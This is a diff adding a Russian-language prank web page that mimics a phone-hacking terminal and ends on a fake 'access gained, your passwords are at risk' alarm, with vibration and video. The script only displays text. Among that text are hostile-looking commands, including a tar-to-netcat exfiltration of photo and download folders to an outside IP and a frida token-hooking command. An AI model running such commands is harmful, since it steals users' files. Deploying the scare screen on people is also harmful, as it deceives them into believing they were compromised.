@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>System Breach // Console</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      background-color: #020402;
+      color: #00ff41;
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 13px;
+      line-height: 1.35;
+      min-height: 100vh;
+      overflow-x: hidden;
+      text-shadow: 0 0 5px rgba(0, 255, 65, 0.35);
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        rgba(0, 0, 0, 0.22),
+        rgba(0, 0, 0, 0.22) 1px,
+        transparent 1px,
+        transparent 3px
+      );
+      pointer-events: none;
+      z-index: 25;
+    }
+
+    /* Очень мягкая красная подсветка по краям */
+    #flash-overlay {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 20;
+      box-shadow: inset 0 0 0 rgba(220, 75, 88, 0);
+      transition: box-shadow 0.16s ease, background-color 0.16s ease;
+    }
+
+    #flash-overlay.flash {
+      box-shadow: inset 0 0 18px rgba(220, 75, 88, 0.16);
+      background-color: rgba(220, 75, 88, 0.01);
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translate(0, 0); }
+      25% { transform: translate(-2px, 1px); }
+      50% { transform: translate(2px, -1px); }
+      75% { transform: translate(-2px, -1px); }
+    }
+
+    .shake {
+      animation: shake 0.2s linear;
+    }
+
+    /* Первое окно: Загрузка... и загрузочная полоса */
+    #loader-screen {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      text-align: center;
+      gap: 22px;
+    }
+
+    .loading-title {
+      font-size: 26px;
+      font-weight: bold;
+      color: #00ff41;
+      letter-spacing: 1px;
+    }
+
+    .progress-bar-box {
+      width: 100%;
+      max-width: 300px;
+      height: 16px;
+      border: 2px solid #00ff41;
+      border-radius: 10px;
+      padding: 2px;
+      background: rgba(0, 255, 65, 0.1);
+      box-shadow: 0 0 16px rgba(0, 255, 65, 0.24);
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      width: 0%;
+      height: 100%;
+      background: #00ff41;
+      border-radius: 6px;
+      box-shadow: 0 0 10px rgba(0, 255, 65, 0.65);
+      transition: width 0.08s linear;
+    }
+
+    .loader-sub {
+      font-size: 12px;
+      color: #00b830;
+    }
+
+    /* Экран терминала */
+    #terminal {
+      display: none;
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 12px 12px 50px;
+    }
+
+    #top-bar {
+      position: sticky;
+      top: 0;
+      background: rgba(2, 4, 2, 0.94);
+      border-bottom: 1px solid #0d3b17;
+      padding: 6px 4px;
+      margin-bottom: 10px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 11px;
+      color: #00cc33;
+      z-index: 12;
+    }
+
+    .line {
+      margin-bottom: 2px;
+      word-break: break-all;
+      color: #00ff41;
+    }
+
+    .ts {
+      color: #008f24;
+    }
+
+    .bright {
+      color: #66ff8c;
+      font-weight: bold;
+    }
+
+    .cmd {
+      color: #99ffb3;
+      font-weight: bold;
+    }
+
+    .soft-alert {
+      color: #d47179;
+      font-weight: bold;
+    }
+
+    .cursor {
+      display: inline-block;
+      width: 8px;
+      height: 14px;
+      background: #00ff41;
+      vertical-align: middle;
+      animation: blink 0.7s infinite;
+    }
+
+    @keyframes blink {
+      0%, 49% { opacity: 1; }
+      50%, 100% { opacity: 0; }
+    }
+
+    /* Финальный экран */
+    #final-alert {
+      display: none;
+      min-height: 100dvh;
+      width: 100%;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      text-align: center;
+      padding: 28px 18px 24px;
+      gap: 18px;
+    }
+
+    .final-copy {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      max-width: 380px;
+      margin-top: auto;
+      margin-bottom: auto;
+    }
+
+    #final-alert .alert-text {
+      color: #ff1e2d;
+      font-size: 25px;
+      font-weight: bold;
+      line-height: 1.35;
+      text-shadow: 0 0 12px rgba(255, 30, 45, 0.45);
+      animation: pulseRed 1.2s infinite alternate;
+    }
+
+    #final-alert .sub-warn {
+      color: #ff2b3a;
+      font-size: 13px;
+      line-height: 1.45;
+      max-width: 350px;
+      font-weight: 600;
+      text-shadow: 0 0 8px rgba(255, 43, 58, 0.3);
+      opacity: 0.96;
+    }
+
+    .meme-box {
+      margin-top: 6px;
+      width: min(255px, 68vw);
+      aspect-ratio: 1 / 1;
+      border-radius: 18px;
+      overflow: hidden;
+      flex-shrink: 0;
+      background: #000;
+      border: 1px solid rgba(255, 50, 65, 0.28);
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.72);
+    }
+
+    @keyframes pulseRed {
+      from { opacity: 0.86; }
+      to { opacity: 1; }
+    }
+
+    .meme-box video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    @keyframes pulseSoftRed {
+      from { opacity: 0.85; }
+      to { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="flash-overlay"></div>
+
+  <!-- Твой звук при запуске терминала и при нажатии на экран -->
+  <audio id="terminal-sound" src="freesound_community-bleep-41488.mp3" preload="auto"></audio>
+
+  <!-- Первое окно при входе -->
+  <div id="loader-screen">
+    <div class="loading-title" id="loading-label">Загрузка...</div>
+    <div class="progress-bar-box">
+      <div class="progress-bar-fill" id="progress-fill"></div>
+    </div>
+    <div class="loader-sub">Автозапуск терминала...</div>
+  </div>
+
+  <!-- Окно терминала -->
+  <div id="terminal">
+    <div id="top-bar">
+      <span>● BREACH SHELL // TTY1</span>
+      <span id="audio-state">SOUND READY</span>
+    </div>
+    <div id="output"></div>
+    <div id="cursor-row"><span id="typing-line" class="cmd"></span><span class="cursor"></span></div>
+  </div>
+
+  <!-- Финальный экран -->
+  <div id="final-alert">
+    <div class="final-copy">
+      <div class="alert-text">Доступ получен. Немедленно отключите свое устройство.</div>
+      <div class="sub-warn">Ваши аккаунты и пароли под угрозой, не беспокойтесь</div>
+    </div>
+    <div class="meme-box">
+      <video id="alert-video" src="1000022205.mp4" playsinline webkit-playsinline loop preload="auto"></video>
+    </div>
+  </div>
+
+  <script>
+    const DURATION_MS = 30000;
+    const LOADER_DURATION_MS = 3000;
+
+    const loaderScreen = document.getElementById("loader-screen");
+    const loadingLabel = document.getElementById("loading-label");
+    const progressFill = document.getElementById("progress-fill");
+    const terminalEl = document.getElementById("terminal");
+    const output = document.getElementById("output");
+    const typingLine = document.getElementById("typing-line");
+    const cursorRow = document.getElementById("cursor-row");
+    const finalAlert = document.getElementById("final-alert");
+    const flashOverlay = document.getElementById("flash-overlay");
+    const audioState = document.getElementById("audio-state");
+    const terminalSound = document.getElementById("terminal-sound");
+    const alertVideo = document.getElementById("alert-video");
+
+    let started = false;
+    let finished = false;
+    let sessionStart = Date.now();
+
+    function playTerminalSound() {
+      try {
+        terminalSound.pause();
+        terminalSound.currentTime = 0;
+        const promise = terminalSound.play();
+        if (promise && typeof promise.then === "function") {
+          promise.then(() => {
+            if (audioState) audioState.textContent = "SOUND: ON";
+          }).catch(() => {
+            if (audioState) audioState.textContent = "TAP FOR SOUND";
+          });
+        }
+      } catch (e) {}
+    }
+
+    function playFinalVideoWithSound() {
+      try {
+        alertVideo.muted = false;
+        alertVideo.volume = 1.0;
+        const promise = alertVideo.play();
+        if (promise && typeof promise.then === "function") {
+          promise.catch(() => {
+            // Если браузер заблокировал звук без тапа — запускаем видео и ждём касания экрана
+            alertVideo.muted = true;
+            alertVideo.play().catch(() => {});
+          });
+        }
+      } catch (e) {}
+    }
+
+    ["touchstart", "pointerdown", "click"].forEach((evt) => {
+      window.addEventListener(evt, () => {
+        if (started && !finished) {
+          playTerminalSound();
+        } else if (finished && (alertVideo.muted || alertVideo.paused)) {
+          alertVideo.muted = false;
+          alertVideo.volume = 1.0;
+          alertVideo.play().catch(() => {});
+        }
+      }, { passive: true });
+    });
+
+    function vibrate(pattern) {
+      try {
+        if (navigator.vibrate) navigator.vibrate(pattern);
+      } catch (e) {}
+    }
+
+    function triggerSoftFlashAndShake() {
+      flashOverlay.classList.add("flash");
+      terminalEl.classList.remove("shake");
+      void terminalEl.offsetWidth;
+      terminalEl.classList.add("shake");
+      vibrate([30, 20, 40]);
+      setTimeout(() => flashOverlay.classList.remove("flash"), 140);
+    }
+
+    function getTimestamp() {
+      const d = new Date();
+      return d.toTimeString().split(" ")[0] + "." + String(d.getMilliseconds()).padStart(3, "0");
+    }
+
+    function randHex(len = 8) {
+      let s = "";
+      const chars = "0123456789abcdef";
+      for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * 16)];
+      return "0x" + s;
+    }
+
+    function randIp() {
+      return `${Math.floor(11 + Math.random() * 215)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 254)}`;
+    }
+
+    function appendLine(text, cls = "", withTs = true) {
+      if (finished) return;
+      const div = document.createElement("div");
+      div.className = "line " + cls;
+      if (withTs) {
+        div.innerHTML = `<span class="ts">[${getTimestamp()}]</span> ${text}`;
+      } else {
+        div.textContent = text;
+      }
+      output.appendChild(div);
+
+      while (output.children.length > 125) {
+        output.removeChild(output.firstChild);
+      }
+      window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function sleep(ms) {
+      return new Promise((r) => setTimeout(r, ms));
+    }
+
+    async function fakeCommandInput(cmdText) {
+      if (finished) return;
+      const prompt = "root@target:~# ";
+      typingLine.textContent = prompt;
+      for (let i = 0; i < cmdText.length; i++) {
+        if (finished) return;
+        typingLine.textContent += cmdText[i];
+        window.scrollTo(0, document.body.scrollHeight);
+        await sleep(9 + Math.random() * 10);
+      }
+      await sleep(40);
+      appendLine(prompt + cmdText, "cmd", false);
+      typingLine.textContent = "";
+    }
+
+    const hackLogs = [
+      () => ({ t: `portscan: open tcp/443, tcp/8443, tcp/5555 on local subnet -> probing ${randIp()}`, c: "" }),
+      () => ({ t: `adb_bridge: wireless debugging handshake forged -> shell uid=2000 granted`, c: "bright" }),
+      () => ({ t: `privesc: abusing binder ioctl ${randHex(6)} -> cred->uid overwritten to 0 (root)`, c: "bright" }),
+      () => ({ t: `ptrace_attach: attached to pid=${Math.floor(2000 + Math.random() * 18000)} (com.android.chrome) [OK]`, c: "" }),
+      () => ({ t: `heap_dump: scanning vma ${randHex(8)}..${randHex(8)} for bearer & session tokens`, c: "" }),
+      () => ({ t: `mitm_proxy: ca_cert injected into trust store -> intercepting TLS 1.3 streams`, c: "bright" }),
+      () => ({ t: `fs_walk: indexing /sdcard/Android/data & /sdcard/DCIM -> ${Math.floor(120 + Math.random() * 900)} files`, c: "" }),
+      () => ({ t: `exfil_worker: aes-256-gcm block #${Math.floor(1 + Math.random() * 256)} pushed to ${randIp()}:8443`, c: "bright" }),
+      () => ({ t: `auth_hook: intercepted oauth refresh token hash=${randHex(12)}`, c: "" }),
+      () => ({ t: `netfilter: dropping outbound firewall rule on wlan0/rmnet0`, c: "soft-alert", alert: true }),
+      () => ({ t: `zygote_inject: shared library libhook_${randHex(4)}.so mapped into runtime`, c: "bright" }),
+      () => ({ t: `sqlite_read: WAL checkpoint flushed -> /data/system_ce/0/accounts_ce.db`, c: "" }),
+      () => ({ t: `c2_beacon: heartbeat ack from ${randIp()}:443 rtt=${Math.floor(12 + Math.random() * 90)}ms`, c: "" }),
+      () => ({ t: `lock_ctrl: system power menu & keyguard override armed`, c: "soft-alert", alert: true })
+    ];
+
+    const commands = [
+      "nmap -sS -Pn -p 443,5555,8443 127.0.0.1",
+      "./root_escalate --binder-race --pid=zygote64",
+      "frida -U -f com.android.chrome -l hook_tokens.js --no-pause",
+      "tar -cf - /sdcard/DCIM /sdcard/Download | nc -w 3 185.220.101.44 8443",
+      "svc power stayon true && settings put global adb_enabled 1"
+    ];
+
+    const doxReconLogs = [
+      () => ({ t: `[DOX-RECON] querying ASN / gateway / edge node -> ${randIp()} (lat=${Math.floor(8 + Math.random() * 65)}ms)`, c: "bright" }),
+      () => ({ t: `[DOX-RECON] resolving locale & timezone -> profile locked`, c: "soft-alert", alert: true }),
+      () => ({ t: `[DOX-RECON] enumerating browser storage & session handles -> vault_id=${randHex(10)}`, c: "soft-alert", alert: true }),
+      () => ({ t: `[DOX-RECON] compiling target dossier #${Math.floor(1000 + Math.random() * 8999)} -> payload ${Math.floor(420 + Math.random() * 1800)} KB packed`, c: "soft-alert", alert: true }),
+      () => ({ t: `[DOX-RECON] dossier export complete -> committing session snapshot to remote sink`, c: "bright" })
+    ];
+
+    const dossierProgressSteps = [
+      { pct: "14%", msg: `[DOSSIER-PKG] [##..................] 14% -> staging profile`, c: "" },
+      { pct: "38%", msg: `[DOSSIER-PKG] [#######.............] 38% -> indexing keys`, c: "bright" },
+      { pct: "67%", msg: `[DOSSIER-PKG] [#############.......] 67% -> encrypting archive`, c: "bright" },
+      { pct: "89%", msg: `[DOSSIER-PKG] [#################...] 89% -> uploading dossier bundle`, c: "soft-alert", alert: true },
+      { pct: "99%", msg: `[DOSSIER-PKG] [###################.] 99% -> checksum verify stalled on final block -> retrying sync...`, c: "soft-alert", alert: true },
+      { pct: "100%", msg: `[DOSSIER-PKG] [####################] 100% -> dossier locked & transferred [OK]`, c: "bright" }
+    ];
+
+    function showFinalAlert() {
+      if (finished) return;
+      finished = true;
+      terminalSound.pause();
+      terminalEl.style.display = "none";
+      cursorRow.style.display = "none";
+      finalAlert.style.display = "flex";
+      flashOverlay.classList.add("flash");
+      vibrate([160, 70, 160, 70, 220]);
+      setTimeout(() => flashOverlay.classList.remove("flash"), 180);
+
+      playFinalVideoWithSound();
+    }
+
+    async function runTerminal() {
+      sessionStart = Date.now();
+      setTimeout(showFinalAlert, DURATION_MS);
+
+      appendLine("Initializing remote intrusion console...", "bright");
+      await sleep(70);
+
+      let cmdIdx = 0;
+      let stepCount = 0;
+      let doxIdx = 0;
+      let dossierProgressSent = false;
+
+      while (!finished) {
+        const elapsed = Date.now() - sessionStart;
+        const isDoxPhase = elapsed >= DURATION_MS * 0.65;
+
+        if (stepCount % 22 === 0) {
+          const cmdList = isDoxPhase
+            ? ["./dox_recon --collect-profile --dump-cookies --correlate-ip", ...commands]
+            : commands;
+          await fakeCommandInput(cmdList[cmdIdx % cmdList.length]);
+          cmdIdx++;
+        }
+
+        for (let b = 0; b < 2; b++) {
+          if (finished) break;
+          const item = isDoxPhase
+            ? (b === 0 ? doxReconLogs[doxIdx++ % doxReconLogs.length]() : hackLogs[Math.floor(Math.random() * hackLogs.length)]())
+            : hackLogs[Math.floor(Math.random() * hackLogs.length)]();
+          appendLine(item.t, item.c, true);
+          if (item.alert) {
+            triggerSoftFlashAndShake();
+          }
+        }
+
+        if (elapsed >= DURATION_MS * 0.82 && !dossierProgressSent) {
+          dossierProgressSent = true;
+          for (let p = 0; p < dossierProgressSteps.length; p++) {
+            if (finished) return;
+            const st = dossierProgressSteps[p];
+            appendLine(st.msg, st.c, true);
+            if (st.alert) triggerSoftFlashAndShake();
+            await sleep(st.pct === "99%" ? 650 : 210);
+          }
+        }
+
+        stepCount++;
+        await sleep(22 + Math.random() * 16);
+      }
+    }
+
+    function launchTerminal() {
+      if (started) return;
+      started = true;
+      vibrate(20);
+      loaderScreen.style.display = "none";
+      terminalEl.style.display = "block";
+      playTerminalSound();
+      runTerminal();
+    }
+
+    const loaderStart = Date.now();
+    const progressTimer = setInterval(() => {
+      if (started) {
+        clearInterval(progressTimer);
+        return;
+      }
+      const elapsed = Date.now() - loaderStart;
+      const pct = Math.min(100, Math.round((elapsed / LOADER_DURATION_MS) * 100));
+      progressFill.style.width = pct + "%";
+      loadingLabel.textContent = `Загрузка... ${pct}%`;
+
+      if (pct >= 100) {
+        clearInterval(progressTimer);
+        setTimeout(launchTerminal, 180);
+      }
+    }, 40);
+  </script>
+</body>
+</html>
